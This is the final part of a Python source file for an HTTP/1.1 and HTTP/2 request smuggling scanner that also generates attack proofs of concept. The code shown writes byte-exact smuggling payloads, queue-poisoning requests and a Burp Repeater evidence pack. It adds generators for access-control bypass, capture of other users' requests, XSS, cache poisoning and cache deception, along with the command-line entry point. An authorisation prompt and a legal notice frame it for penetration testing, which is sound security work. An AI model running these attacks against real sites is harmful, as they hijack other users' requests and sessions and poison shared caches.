                      f"Content-Length: 15\r\n\r\nx=")
        queue = wrap_smuggle(f.kind, f.host, f.path, queue_smug).encode("latin-1")

        for tag, blob in (("detect", detect), ("queue", queue)):
            name = f"{i:03d}_{safe_host}_{f.kind}_{tag}.raw"
            with open(os.path.join(dirpath, name), "wb") as fh:
                fh.write(blob)
            n_written += 1
        index.append(f"[{i:03d}] {f.kind:5s} {f.scheme}://{f.host}:{f.port}{f.path}  "
                     f"(mutation: {f.mutation_name})")
        index.append(f"      python3 send_raw.py {f.host} {f.port} "
                     f"{i:03d}_{safe_host}_{f.kind}_detect.raw")
    with open(os.path.join(dirpath, "INDEX.txt"), "w", encoding="utf-8") as fh:
        fh.write("\n".join(index) + "\n")

    # classify each detect file: clipboard-paste-safe (pure CRLF) vs needs
    # byte-exact delivery (contains an intentional lone-LF mutation byte)
    safe, exact = [], []
    for name in sorted(os.listdir(dirpath)):
        if not name.endswith("_detect.raw"):
            continue
        b = open(os.path.join(dirpath, name), "rb").read()
        lone_lf = any(c == 0x0a and (i == 0 or b[i - 1] != 0x0d)
                      for i, c in enumerate(b))
        (exact if lone_lf else safe).append(name)
    with open(os.path.join(dirpath, "PASTE_SAFETY.txt"), "w", encoding="utf-8") as fh:
        fh.write("PASTE-SAFE detect files (pure CRLF — Notepad++ copy/paste is fine):\n")
        fh.write("\n".join("  " + s for s in safe) + "\n\n")
        fh.write("NEEDS BYTE-EXACT delivery (contain an intentional lone-LF byte;\n"
                 "clipboard will alter them — use --proxy or send_raw.py):\n")
        fh.write("\n".join("  " + s for s in exact) + ("\n" if exact else "  (none)\n"))
    return n_written


def write_poc_file(path, findings, args):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("=" * 78 + "\n")
        fh.write("HTTP REQUEST SMUGGLING — PoC EVIDENCE PACK (Burp Repeater ready)\n")
        fh.write(f"Generated: {ts}   Confirmed findings: {len(findings)}\n")
        fh.write("=" * 78 + "\n")
        fh.write(
            "\nBURP REPEATER SETUP\n"
            "  1. Paste a raw request into a Repeater tab.\n"
            "  2. UNCHECK 'Update Content-Length' (Repeater menu) — lengths are\n"
            "     intentionally malformed and Burp must not rewrite them.\n"
            "  3. Force HTTP/1.1 for H1 PoCs (Inspector > request attributes).\n"
            "  4. Odd bytes (\\r\\n, \\x0b, \\x00) are given base64 per finding for\n"
            "     byte-perfect replay via Burp's hex view.\n"
            "  5. Most attacks need the request sent TWICE (attacker prime + victim\n"
            "     request). Turbo Intruder automates the race.\n"
            "  6. ATTACK F (response-queue) is the safest live confirmation; ATTACKS\n"
            "     B/D/E can affect other users — use canaries / your own accounts.\n\n"
            "LEGAL: authorised targets only. You are responsible for scope & impact.\n")
        fh.write("=" * 78 + "\n\n")

        if not findings:
            fh.write("No confirmed findings.\n")
            return

        for i, f in enumerate(findings, 1):
            fh.write("#" * 78 + "\n")
            fh.write(f"# FINDING {i}: {f.kind} [{f.channel}] on "
                     f"{f.scheme}://{f.host}:{f.port}{f.path}\n")
            fh.write(f"# Mutation   : {f.mutation_name}\n")
            fh.write(f"# Confidence : {f.confidence}\n")
            fh.write(f"# Evidence   : {f.evidence}\n")
            fh.write(f"# Timing(s)  : base={f.baseline_s} atk1={f.attack1_s} "
                     f"ctrl={f.control_s} atk2={f.attack2_s}\n")
            fh.write("#" * 78 + "\n\n")

            if f.channel == "http/1.1":
                raw = base64.b64decode(f.raw_request_b64)
                fh.write("## DETECTION REQUEST (expect a hang) — human-readable\n")
                fh.write(_visualize(raw) + "\n\n")
                fh.write("## DETECTION REQUEST — exact bytes (base64)\n")
                fh.write(f.raw_request_b64 + "\n\n")
            else:
                fh.write("## HTTP/2 DETECTION VECTOR\n")
                fh.write(f.mutation_repr + "\n\n")

            fh.write(poc_control_bypass(f))
            fh.write(poc_capture_request(f))
            fh.write(poc_xss(f))
            fh.write(poc_cache_poison(f))
            fh.write(poc_cache_deception(f))
            fh.write(poc_queue_poison(f))
            h2b = poc_h2_specific(f)
            if h2b:
                fh.write(h2b)
            fh.write("\n")


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #

def confirm_authorization(args):
    if args.authorize:
        return True
    try:
        return input("Confirm you are AUTHORIZED to test these targets [y/N]: "
                     ).strip().lower() in ("y", "yes")
    except EOFError:
        return False


def build_argparser():
    p = argparse.ArgumentParser(
        description="Advanced HTTP/1.1 + HTTP/2 request smuggling scanner & PoC forge.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    g = p.add_argument_group("targets")
    g.add_argument("-u", "--url")
    g.add_argument("-l", "--list")
    o = p.add_argument_group("output")
    o.add_argument("-o", "--poc", default="smuggle_poc.txt")
    o.add_argument("-j", "--json", default="smuggle_findings.json")
    o.add_argument("--raw-dir", default=None,
                   help="also write byte-exact .raw files (guaranteed CRLF) + a "
                        "sender helper into this directory")
    o.add_argument("-v", "--verbose", action="store_true")
    t = p.add_argument_group("tuning")
    t.add_argument("-w", "--workers", type=int, default=10)
    t.add_argument("--timeout", type=float, default=10.0)
    t.add_argument("--attack-timeout", type=float, default=8.0)
    t.add_argument("--min-hang", type=float, default=5.0)
    t.add_argument("--hang-factor", type=float, default=6.0)
    t.add_argument("--baseline-samples", type=int, default=3)
    t.add_argument("--delay", type=float, default=0.15)
    t.add_argument("--max-response-bytes", type=int, default=8192)
    t.add_argument("--insecure", action="store_true", default=True)
    t.add_argument("--stop-on-first", action="store_true")
    t.add_argument("--no-http2", dest="http2", action="store_false", default=True,
                   help="disable HTTP/2 downgrade tests")
    t.add_argument("--diff-confirm", action="store_true",
                   help="add differential-response confirmation (touches response "
                        "queue; raises confidence to high)")
    t.add_argument("--min-confidence", choices=["low", "medium", "high"],
                   default="medium",
                   help="only report findings at or above this confidence "
                        "(default medium: suppresses timing/heuristic noise)")
    p.add_argument("--authorize", action="store_true")
    return p


def main(argv=None):
    args = build_argparser().parse_args(argv)
    print(BANNER, file=sys.stderr)
    if not _HAS_H2 and args.http2:
        print("[i] h2 library not installed — HTTP/2 tests disabled "
              "(pip install h2).", file=sys.stderr)
    if not args.url and not args.list:
        print("[-] Provide -u URL or -l list.txt", file=sys.stderr)
        return 2
    targets = load_targets(args)
    if not targets:
        print("[-] No valid targets.", file=sys.stderr)
        return 2
    print(f"[*] Loaded {len(targets)} unique target(s).", file=sys.stderr)
    if not confirm_authorization(args):
        print("[-] Authorization not confirmed. Aborting.", file=sys.stderr)
        return 3

    sc = Scanner(args)
    t0 = time.time()
    findings = sc.run(targets)
    dt = time.time() - t0
    order = {"high": 0, "medium": 1, "low": 2}
    # confidence gate — drop anything below --min-confidence
    threshold = order[args.min_confidence]
    total_raw = len(findings)
    findings = [f for f in findings if order.get(f.confidence, 9) <= threshold]
    dropped = total_raw - len(findings)
    if dropped:
        print(f"[i] Suppressed {dropped} finding(s) below "
              f"'{args.min_confidence}' confidence.", file=sys.stderr)
    findings.sort(key=lambda f: (f.host, order.get(f.confidence, 9), f.kind, f.mutation_name))

    with open(args.json, "w", encoding="utf-8") as fh:
        json.dump([asdict(f) for f in findings], fh, indent=2)
    write_poc_file(args.poc, findings, args)
    if args.raw_dir:
        n = write_raw_dir(args.raw_dir, findings, args)
        print(f"[*] RAW  -> {args.raw_dir}/ ({n} byte-exact .raw files + send_raw.py)",
              file=sys.stderr)

    print("\n" + "=" * 60, file=sys.stderr)
    print(f"[*] Done in {dt:.1f}s. Confirmed findings: {len(findings)}", file=sys.stderr)
    for f in findings:
        print(f"    [{f.confidence:6s}] {f.kind:7s} {f.channel:8s} "
              f"{f.host}:{f.port}{f.path} ({f.mutation_name})", file=sys.stderr)
    print(f"[*] PoC  -> {args.poc}\n[*] JSON -> {args.json}", file=sys.stderr)
    print("=" * 60, file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
